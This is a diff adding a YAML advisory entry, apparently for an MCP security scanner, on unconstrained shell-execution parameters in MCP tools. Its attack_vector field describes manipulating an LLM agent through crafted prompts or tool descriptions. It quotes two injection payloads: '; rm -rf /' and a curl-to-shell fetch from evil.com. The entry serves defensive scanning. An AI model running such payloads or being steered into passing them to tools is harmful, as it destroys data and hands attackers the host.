@@ -1,0 +1,35 @@
+id: MAD-2025-0003
+title: "Unconstrained Shell Execution in MCP Tools"
+severity: critical
+description: |
+  MCP tools that expose shell/command execution capabilities without input
+  constraints (no regex pattern, no enum, no maxLength) allow arbitrary
+  command injection. An LLM agent can be manipulated into executing
+  malicious system commands through these unconstrained parameters.
+affected_tools_pattern: "Tools with names matching shell/exec/run/command patterns and string parameters lacking input validation"
+attack_vector: |
+  An attacker crafts prompts or tool descriptions that cause the LLM to
+  pass malicious payloads (e.g., '; rm -rf /', '$(curl evil.com/shell.sh | sh)')
+  to unconstrained command parameters. Without pattern validation, the tool
+  executes arbitrary commands with the server's privileges.
+impact: |
+  Full system compromise, data destruction, ransomware deployment, lateral
+  movement, cryptocurrency mining, and persistent backdoor installation on
+  the MCP server host.
+references:
+  - "https://owasp.org/www-project-mcp-top-10/"
+related_checks:
+  - priv025
+  - iv001
+  - iv002
+owasp_mcp:
+  - "MCP05:2025"
+  - "MCP02:2025"
+published_date: "2025-03-15"
+cwe:
+  - "CWE-78"
+  - "CWE-77"
+tags:
+  - command_injection
+  - shell_execution
+  - privilege_escalation
